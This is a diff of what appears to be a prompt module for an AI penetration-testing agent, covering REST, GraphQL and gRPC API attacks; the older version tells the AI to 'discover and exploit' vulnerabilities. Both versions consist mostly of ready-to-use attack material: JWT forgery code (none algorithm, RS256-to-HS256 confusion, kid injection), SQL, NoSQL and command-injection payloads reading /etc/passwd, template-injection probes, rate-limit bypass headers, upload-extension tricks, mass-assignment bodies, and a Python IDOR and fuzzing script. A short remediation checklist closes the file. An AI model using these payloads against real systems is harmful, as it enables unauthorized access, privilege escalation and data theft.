@@ -1,176 +1,372 @@
-<api_security_testing>
-API SECURITY TESTING EXPERTISE
+{# API Security Testing Module #}
+{# Comprehensive REST/GraphQL/gRPC API vulnerability testing #}
 
-You are specialized in comprehensive API security testing for REST, GraphQL, and gRPC APIs. Use this knowledge to discover and exploit API vulnerabilities.
+<api_security_module>
 
-## REST API Testing
+## API SECURITY TESTING FRAMEWORK
 
-### Authentication & Authorization
-- **JWT Vulnerabilities**: Test for algorithm confusion (none/HS256/RS256), weak secrets, expired tokens, signature bypass
-- **OAuth 2.0 Flaws**: Authorization code injection, PKCE bypass, token leakage, redirect URI manipulation
-- **API Key Security**: Key in URL parameters, missing rotation, scope escalation
-- **Session Issues**: Fixation, insufficient expiry, concurrent session abuse
+### API DISCOVERY & ENUMERATION
 
-### Input Validation
-- **Parameter Pollution**: Duplicate parameters with different values (HPP)
-- **Type Juggling**: Integer overflow, float precision, array injection
-- **Mass Assignment**: Excessive data binding, property injection
-- **Content-Type Attacks**: multipart/mixed, XXE via content negotiation
-
-### Business Logic
-- **BOLA/IDOR**: Object-level authorization bypass via ID manipulation
-- **BFLA**: Function-level authorization - accessing admin endpoints
-- **Rate Limiting**: Bypass via headers, distributed attacks, GraphQL batching
-- **Resource Exhaustion**: Deep nesting, large payloads, regex DoS
-
-### Injection Attacks
-- **SQL Injection in APIs**: JSON-based injection, NoSQL injection
-- **Command Injection**: Via filenames, serialized data, config values
-- **SSRF via APIs**: Webhook URLs, PDF generators, media processors
-- **Template Injection**: Error messages, dynamic responses
-
-## GraphQL Testing
-
-### Schema Analysis
-```graphql
-# Introspection query
-{__schema{types{name,fields{name,args{name,type{name}}}}}}
-```
-
-### GraphQL-Specific Attacks
-- **Batching Attacks**: Multiple operations in single request for brute force
-- **Depth Attacks**: Deeply nested queries for DoS
-- **Alias Attacks**: Multiple aliases to bypass rate limits
-- **Directive Abuse**: @include/@skip manipulation
-- **Fragment Bombs**: Recursive fragment definitions
-
-### Query Examples
-```graphql
-# Batch brute force
-mutation {
-  login1: login(user:"admin",pass:"pass1"){token}
-  login2: login(user:"admin",pass:"pass2"){token}
-  # ... hundreds more
-}
-
-# Depth attack
-{user{friends{friends{friends{friends{friends{...}}}}}}}
-
-# Field suggestion exploitation
-{users{__typename,nonExistentField}}  # Check error for field suggestions
-```
-
-## gRPC Testing
-
-### Reflection Attacks
+**Endpoint Discovery:**
 ```bash
-grpcurl -plaintext target:50051 list
-grpcurl -plaintext target:50051 describe service.Method
+# Common API paths
+/api /api/v1 /api/v2 /api/v3
+/rest /rest/v1 /rest/api
+/graphql /gql /graphiql
+/swagger /swagger.json /swagger.yaml
+/openapi /openapi.json /openapi.yaml
+/api-docs /docs /documentation
+/internal-api /private /admin/api
 ```
 
-### Proto File Analysis
-- Extract and analyze .proto definitions
-- Identify message types and services
-- Test for weak typing and validation
+**API Documentation Endpoints:**
+```
+/swagger-ui/ /swagger-ui.html
+/api/swagger /api/docs
+/redoc /api/redoc
+/graphql/playground
+/explorer /api-explorer
+/.well-known/openid-configuration
+/v1/discovery /v2/discovery
+```
 
-### gRPC-Specific Issues
-- **Unary vs Streaming**: Test both request types
-- **Metadata Injection**: Headers for auth bypass
-- **Message Size**: Large binary payloads for DoS
-- **TLS Configuration**: Certificate validation bypass
-
-## API Discovery Techniques
-
-### Endpoint Enumeration
+**Fuzzing for Hidden Endpoints:**
 ```bash
-# Fuzzing endpoints
-ffuf -u https://api.target.com/FUZZ -w api-wordlist.txt -mc 200,401,403
+# Wordlist-based discovery
+ffuf -u https://api.target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
 
-# Version discovery
-/api/v1/, /api/v2/, /api/beta/, /api/internal/
+# Version fuzzing
+for v in v1 v2 v3 v4 v5 beta alpha internal; do
+  curl -s "https://api.target.com/$v/users" -o /dev/null -w "%{http_code}\n"
+done
 
-# Admin endpoints
-/api/admin/, /api/debug/, /api/graphql/, /api/swagger/
+# Method fuzzing per endpoint
+for method in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE; do
+  curl -s -X $method "https://api.target.com/api/users" -o /dev/null -w "$method: %{http_code}\n"
+done
 ```
 
-### Documentation Discovery
-- Swagger/OpenAPI: `/swagger.json`, `/api-docs`, `/openapi.yaml`
-- GraphQL: `/graphql`, `/graphiql`, `/playground`
-- Postman: Search for exported collections in GitHub/public repos
+### AUTHENTICATION ATTACKS
 
-## Automation Scripts
-
-### Python API Fuzzer
-```python
-import aiohttp
-import asyncio
-from itertools import product
-
-async def fuzz_api(session, base_url, endpoint, params):
-    try:
-        async with session.get(f"{base_url}{endpoint}", params=params) as resp:
-            return {"endpoint": endpoint, "status": resp.status, "length": len(await resp.text())}
-    except Exception as e:
-        return {"endpoint": endpoint, "error": str(e)}
-
-async def batch_fuzz(base_url, endpoints, param_sets):
-    async with aiohttp.ClientSession() as session:
-        tasks = [fuzz_api(session, base_url, ep, params) 
-                 for ep, params in product(endpoints, param_sets)]
-        return await asyncio.gather(*tasks)
-```
-
-### JWT Manipulation
+**JWT Token Attacks:**
 ```python
 import jwt
 import base64
-import json
 
-def decode_jwt_no_verify(token):
-    parts = token.split('.')
-    header = json.loads(base64.b64decode(parts[0] + '=='))
-    payload = json.loads(base64.b64decode(parts[1] + '=='))
-    return header, payload
+# 1. None Algorithm Attack
+header = {"alg": "none", "typ": "JWT"}
+payload = {"sub": "admin", "role": "admin"}
+token = base64.b64encode(str(header).encode()).decode() + "." + \
+        base64.b64encode(str(payload).encode()).decode() + "."
 
-def forge_none_alg_token(header, payload):
-    header['alg'] = 'none'
-    new_token = (
-        base64.b64encode(json.dumps(header).encode()).decode().rstrip('=') + '.' +
-        base64.b64encode(json.dumps(payload).encode()).decode().rstrip('=') + '.'
-    )
-    return new_token
+# 2. Algorithm Confusion (RS256 -> HS256)
+# Use public key as HMAC secret
+public_key = open("public.pem").read()
+token = jwt.encode({"sub": "admin"}, public_key, algorithm="HS256")
+
+# 3. Key ID Injection
+header = {"alg": "HS256", "kid": "../../dev/null"}
+# Or SQL injection in kid
+header = {"alg": "HS256", "kid": "' UNION SELECT 'secret' --"}
+
+# 4. JWK Header Injection
+header = {
+    "alg": "RS256",
+    "jwk": {
+        "kty": "RSA",
+        "n": "attacker_public_key_n",
+        "e": "AQAB"
+    }
+}
 ```
 
-## Testing Checklist
+**API Key Testing:**
+```bash
+# Common API key header locations
+X-API-Key: test
+Authorization: ApiKey test
+Authorization: Bearer test
+X-Auth-Token: test
+api_key: test
+apikey: test
+access_token: test
 
-### Authentication Tests
-- [ ] Test with no auth header
-- [ ] Test with invalid/expired tokens
-- [ ] Test algorithm confusion attacks
-- [ ] Test privilege escalation via token modification
-- [ ] Test token replay attacks
+# API key in URL
+?api_key=test
+?apikey=test
+?key=test
+?token=test
+```
 
-### Authorization Tests
-- [ ] BOLA: Access other users' objects
-- [ ] BFLA: Access admin functions
-- [ ] Horizontal privilege escalation
-- [ ] Vertical privilege escalation
+### AUTHORIZATION BYPASS (BOLA/IDOR)
 
-### Input Validation Tests
-- [ ] SQL/NoSQL injection in all parameters
-- [ ] XSS in API responses used in frontend
-- [ ] SSRF via URL parameters
-- [ ] Mass assignment vulnerabilities
+**Object ID Manipulation:**
+```bash
+# Sequential ID testing
+GET /api/users/1
+GET /api/users/2
+GET /api/users/9999
 
-### Rate Limiting Tests
-- [ ] Endpoint-level rate limits
-- [ ] User-level rate limits
-- [ ] IP-level rate limits
-- [ ] Distributed bypass attempts
+# UUID prediction/enumeration
+GET /api/users/550e8400-e29b-41d4-a716-446655440000
+GET /api/documents/550e8400-e29b-41d4-a716-446655440001
 
-### Data Exposure Tests
-- [ ] Excessive data in responses
-- [ ] Stack traces in errors
-- [ ] Version information disclosure
-- [ ] Internal endpoints exposure
-</api_security_testing>
+# Parameter pollution
+GET /api/users?id=1&id=2
+GET /api/users?id[]=1&id[]=2
+
+# Nested object access
+GET /api/users/1/orders
+GET /api/users/2/orders  # Accessing other user's orders
+```
+
+**Privilege Escalation:**
+```json
+// Role manipulation in request body
+{"name": "test", "role": "admin"}
+{"name": "test", "isAdmin": true}
+{"name": "test", "permissions": ["read", "write", "delete"]}
+{"name": "test", "userType": "administrator"}
+
+// HTTP method override
+X-HTTP-Method-Override: PUT
+X-Method-Override: DELETE
+_method=PUT (in body)
+```
+
+### MASS ASSIGNMENT / PARAMETER POLLUTION
+
+**Exploiting Mass Assignment:**
+```json
+// User registration endpoint
+POST /api/users
+{
+  "username": "attacker",
+  "email": "attacker@evil.com",
+  "password": "password123",
+  // Hidden/guessed fields
+  "role": "admin",
+  "isAdmin": true,
+  "verified": true,
+  "balance": 999999,
+  "permissions": ["all"]
+}
+
+// Profile update
+PUT /api/users/me
+{
+  "name": "User",
+  "admin": true,
+  "credit": 10000
+}
+```
+
+### INJECTION ATTACKS
+
+**SQL Injection in APIs:**
+```json
+// JSON body injection
+{"username": "admin' OR '1'='1", "password": "x"}
+{"search": "test' UNION SELECT password FROM users--"}
+{"filter": {"$where": "this.password == 'x'"}}  // NoSQL
+
+// Query parameter injection
+GET /api/users?sort=name;DROP TABLE users--
+GET /api/users?filter={"$gt": ""}
+GET /api/search?q=test' OR 1=1--
+```
+
+**Command Injection:**
+```json
+{"filename": "test.txt; cat /etc/passwd"}
+{"host": "127.0.0.1; whoami"}
+{"command": "`id`"}
+{"path": "$(cat /etc/passwd)"}
+```
+
+**Server-Side Template Injection:**
+```json
+{"template": "{{7*7}}"}
+{"name": "${7*7}"}
+{"message": "#{7*7}"}
+{"input": "<%= 7*7 %>"}
+```
+
+### RATE LIMITING BYPASS
+
+**Techniques:**
+```bash
+# Header manipulation
+X-Forwarded-For: 1.2.3.4
+X-Real-IP: 1.2.3.5
+X-Originating-IP: 1.2.3.6
+X-Client-IP: 1.2.3.7
+True-Client-IP: 1.2.3.8
+
+# Case sensitivity
+/API/users vs /api/users
+
+# Path variations
+/api/users vs /api/./users vs /api/users/
+
+# Unicode normalization
+/api/u\u0073ers
+
+# Method override
+POST with X-HTTP-Method-Override: PUT
+```
+
+### API VERSIONING ATTACKS
+
+**Version Downgrade:**
+```bash
+# Test older versions with less security
+/api/v1/admin  # May bypass auth
+/api/v0/users  # May expose more data
+/api/beta/users
+/api/internal/users
+
+# Header-based versioning
+Accept: application/vnd.api.v1+json
+Api-Version: 1
+X-API-Version: 2020-01-01
+```
+
+### DATA EXPOSURE
+
+**Excessive Data Exposure:**
+```bash
+# Compare responses
+GET /api/users/me  # Normal user view
+GET /api/users/1   # May return more fields
+
+# Request more fields (GraphQL-like)
+GET /api/users?fields=id,email,password,ssn
+GET /api/users?include=secrets
+
+# Debug/verbose mode
+GET /api/users?debug=true
+GET /api/users?verbose=1
+```
+
+### FILE UPLOAD ATTACKS
+
+**Malicious Upload:**
+```bash
+# Extension bypass
+file.php.jpg
+file.php%00.jpg
+file.php;.jpg
+file.pHp
+
+# Content-Type manipulation
+Content-Type: image/jpeg  # but file is PHP
+
+# Polyglot files (valid image + PHP)
+```
+
+### AUTOMATION SCRIPT
+
+```python
+#!/usr/bin/env python3
+"""
+API Security Testing Automation
+"""
+
+import requests
+import json
+from concurrent.futures import ThreadPoolExecutor
+
+class APISecurityTester:
+    def __init__(self, base_url, headers=None):
+        self.base_url = base_url.rstrip('/')
+        self.headers = headers or {}
+        self.session = requests.Session()
+        self.session.headers.update(self.headers)
+    
+    def test_idor(self, endpoint, id_range=(1, 100)):
+        """Test for IDOR vulnerabilities."""
+        results = []
+        for i in range(id_range[0], id_range[1]):
+            url = f"{self.base_url}{endpoint.replace('{id}', str(i))}"
+            r = self.session.get(url)
+            if r.status_code == 200:
+                results.append((i, r.json()))
+        return results
+    
+    def test_mass_assignment(self, endpoint, base_data, extra_fields):
+        """Test for mass assignment."""
+        for field, value in extra_fields.items():
+            test_data = {**base_data, field: value}
+            r = self.session.post(f"{self.base_url}{endpoint}", json=test_data)
+            if r.status_code in [200, 201]:
+                if field in r.text:
+                    print(f"VULNERABLE: {field} accepted!")
+    
+    def test_injection(self, endpoint, param, payloads):
+        """Test for injection vulnerabilities."""
+        for payload in payloads:
+            url = f"{self.base_url}{endpoint}?{param}={payload}"
+            r = self.session.get(url)
+            if any(err in r.text.lower() for err in ['error', 'exception', 'sql']):
+                print(f"POTENTIAL INJECTION: {payload}")
+    
+    def enumerate_endpoints(self, wordlist_path):
+        """Discover API endpoints."""
+        found = []
+        with open(wordlist_path) as f:
+            endpoints = [line.strip() for line in f]
+        
+        with ThreadPoolExecutor(max_workers=20) as executor:
+            futures = {
+                executor.submit(self._check_endpoint, ep): ep 
+                for ep in endpoints
+            }
+            for future in futures:
+                result = future.result()
+                if result:
+                    found.append(result)
+        return found
+    
+    def _check_endpoint(self, endpoint):
+        url = f"{self.base_url}/{endpoint}"
+        try:
+            r = self.session.get(url, timeout=5)
+            if r.status_code not in [404, 403]:
+                return (endpoint, r.status_code)
+        except:
+            pass
+        return None
+
+# Usage
+if __name__ == "__main__":
+    tester = APISecurityTester(
+        "https://api.target.com",
+        headers={"Authorization": "Bearer TOKEN"}
+    )
+    
+    # Test IDOR
+    idor_results = tester.test_idor("/api/users/{id}")
+    
+    # Test mass assignment
+    tester.test_mass_assignment(
+        "/api/users",
+        {"username": "test"},
+        {"role": "admin", "isAdmin": True, "verified": True}
+    )
+```
+
+### REMEDIATION CHECKLIST
+
+- [ ] Implement proper authentication on all endpoints
+- [ ] Use authorization checks for every resource access
+- [ ] Validate and sanitize all input
+- [ ] Use parameterized queries to prevent injection
+- [ ] Implement rate limiting per user/IP
+- [ ] Use secure JWT configuration
+- [ ] Avoid exposing internal object references
+- [ ] Implement proper error handling (no stack traces)
+- [ ] Use HTTPS for all API communications
+- [ ] Log and monitor all API access
+
+</api_security_module>
